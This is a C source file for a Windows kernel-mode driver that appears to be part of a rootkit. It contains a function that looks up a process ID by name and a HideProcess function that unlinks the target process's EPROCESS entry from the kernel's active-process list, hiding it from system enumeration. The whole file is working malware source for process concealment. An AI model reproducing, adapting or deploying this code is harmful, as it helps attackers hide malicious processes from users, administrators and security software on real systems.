#include "rk.h"
#include "DefSystemVar.h"
#include "ToolFnc.h"
#include "InitializeInjectRelevantInfo.h"
#include "HideProcess.h"

LIST_ENTRY g_HidePrcoessListInfo;

void InitializeHideProcessList()
{
	InitializeListHead(&g_HidePrcoessListInfo);
}
ULONG GetProcessId(PCHAR pProcName)
{
	NTSTATUS Status;
	ULONG ulNeedSize;
	PVOID pProcInfo;
	PWCHAR pProcessNameW;
	//CHAR ProcessName[MAX_PATH];
	PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation;
	PSYSTEM_THREAD_INFORMATION pSystemThreadInformation;
	UNICODE_STRING UniProcessName;
	ANSI_STRING AnsiProcessName;

	ulNeedSize = 0;
	pProcInfo = NULL;
	pSystemProcessInformation = NULL;
	pSystemThreadInformation = NULL;
	//RtlZeroMemory(ProcessName,MAX_PATH);

	Status = ZwQuerySystemInformation(SystemProcessesAndThreadsInformation,&ulNeedSize,0,&ulNeedSize);
	if (Status == STATUS_INFO_LENGTH_MISMATCH)
	{
		pProcInfo = ExAllocatePool(NonPagedPool,ulNeedSize); 
		if (pProcInfo == NULL) 
		{
			return 0;
		}
		RtlZeroMemory(pProcInfo,ulNeedSize);
	}
	Status = ZwQuerySystemInformation(SystemProcessesAndThreadsInformation,pProcInfo,ulNeedSize,NULL);
	if (NT_ERROR(Status))
	{
		if (pProcInfo)
		{
			ExFreePool(pProcInfo);
			pProcInfo = NULL;
		}
		return 0; 
	}
	pSystemProcessInformation = (PSYSTEM_PROCESS_INFORMATION)pProcInfo;

	while(TRUE)
	{
		pProcessNameW = pSystemProcessInformation->ProcessName.Buffer;
		if (pProcessNameW == NULL)
		{
			pProcessNameW = L"NULL";
			pSystemProcessInformation = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)pSystemProcessInformation + \
				pSystemProcessInformation->NextEntryDelta);
			continue;
		}
		if (RtlCreateUnicodeString(&UniProcessName,pProcessNameW) == TRUE)
		{
			RtlUnicodeStringToAnsiString(&AnsiProcessName,&UniProcessName,TRUE);
			if(_strnicmp(AnsiProcessName.Buffer,pProcName,strlen(pProcName)) == 0)
			{
				DbgPrint("ProcessId is %d %x\n",pSystemProcessInformation->ProcessId,pSystemProcessInformation->ProcessId);
				if (UniProcessName.Buffer && UniProcessName.Length)
				{
					RtlFreeUnicodeString(&UniProcessName);
				}
				RtlFreeAnsiString(&AnsiProcessName);
				return pSystemProcessInformation->ProcessId;
			}
			if (UniProcessName.Buffer && UniProcessName.Length)
			{
				RtlFreeUnicodeString(&UniProcessName);
			}
			RtlFreeAnsiString(&AnsiProcessName);
			if (pSystemProcessInformation->NextEntryDelta == 0)
			{
				break;
			}
			pSystemProcessInformation = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)pSystemProcessInformation + \
				pSystemProcessInformation->NextEntryDelta);
		}
	}
	if (pProcInfo)
	{
		ExFreePool(pProcInfo);
		pProcInfo = NULL;
	}
	return 0;
}
NTSTATUS HideProcess(ULONG ulHideProcessId)
{
	NTSTATUS Status;
	PLIST_ENTRY pListActiveProcs;
	PVOID pEProcess;
	PHIDE_PROCESS_LIST_INFO pHideProcessListInfo;

	Status = STATUS_UNSUCCESSFUL;

	if (ulHideProcessId == 0 || \
		ulHideProcessId == 0x04 || \
		ulHideProcessId == 0x08)
	{
		Status = STATUS_INVALID_PARAMETER;
		return Status;
	}

	pListActiveProcs = NULL;
	pEProcess = NULL;
	pHideProcessListInfo = NULL;

	Status = PsLookupProcessByProcessId((HANDLE)ulHideProcessId,(PEPROCESS *)&pEProcess);
	if (NT_ERROR(Status))
	{
		return Status;
	}
	pListActiveProcs = (PLIST_ENTRY)((ULONG_PTR)pEProcess + g_InjectRelevantOffset.ulOffsetFlink);
	if (NULL == pListActiveProcs || MmIsAddressValid(pEProcess) == FALSE)
	{
		ObDereferenceObject(pEProcess);
		Status = STATUS_INVALID_ADDRESS;
		return Status;
	}
	pHideProcessListInfo = ExAllocatePool(NonPagedPool,sizeof(HIDE_PROCESS_LIST_INFO));
	if (NULL == pHideProcessListInfo)
	{
		ObDereferenceObject(pEProcess);
		Status = STATUS_MEMORY_NOT_ALLOCATED;
		return Status;
	}
	RtlZeroMemory(pHideProcessListInfo,sizeof(HIDE_PROCESS_LIST_INFO));

	pHideProcessListInfo->pHideProcessListEntry = pListActiveProcs;
	pHideProcessListInfo->ulProcessId = ulHideProcessId;
	InitializeListHead(&pHideProcessListInfo->NextList);
	InsertTailList(&g_HidePrcoessListInfo,&pHideProcessListInfo->NextList);
	
	pListActiveProcs->Blink->Flink = pListActiveProcs->Flink;
	pListActiveProcs->Flink->Blink= pListActiveProcs->Blink;

	ObDereferenceObject(pEProcess);
	Status = STATUS_SUCCESS;
	return Status;
}